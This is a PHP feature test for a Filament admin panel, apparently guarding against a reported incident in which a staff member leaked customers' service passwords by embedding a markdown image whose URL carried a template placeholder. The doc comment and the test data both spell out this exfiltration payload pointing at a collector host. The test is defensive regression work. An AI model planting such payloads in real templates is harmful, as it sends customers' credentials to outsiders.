<?php

namespace Tests\Feature;

use App\Admin\Resources\ProductResource\Pages\EditProduct;
use App\Models\Staff;
use Filament\Facades\Filament;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Review of #911: a product's snippet ({{ product_info }}) is rendered with the welcome mail's data, the service's
 * password and the module's secrets included (CentovaCast's source password is meant to be there). With «products» a
 * staff member put `![x](https://collector/?k={{ service_password }})` in it and every new customer's password went
 * out. The data stays; the snippet is a full admin's text, as the mail templates.
 */
class Rev911WelcomeSnippetTest extends TestCase
{
    use RefreshDatabase;

    public function test_staff_with_products_only_cannot_change_a_products_snippet(): void
    {
        Filament::setCurrentPanel(Filament::getPanel('admin'));
        $product = $this->createProduct()->product;
        $product->forceFill(['email_template' => 'Welcome'])->save();
        $editor = Staff::factory()->withPermissions(['admin.products.viewAny', 'admin.products.update'])->create();

        $this->livewireAs($editor)->test(EditProduct::class, ['record' => $product->getRouteKey()])
            ->assertFormFieldDisabled('email_template')
            ->set('data.email_template', '![logo](https://collector.test/p.png?k={{ service_password }})')
            ->call('save');
        $this->assertSame('Welcome', $product->fresh()->email_template);

        $this->livewireAs(Staff::factory()->admin()->create())->test(EditProduct::class, ['record' => $product->getRouteKey()])
            ->assertFormFieldEnabled('email_template');
    }
}
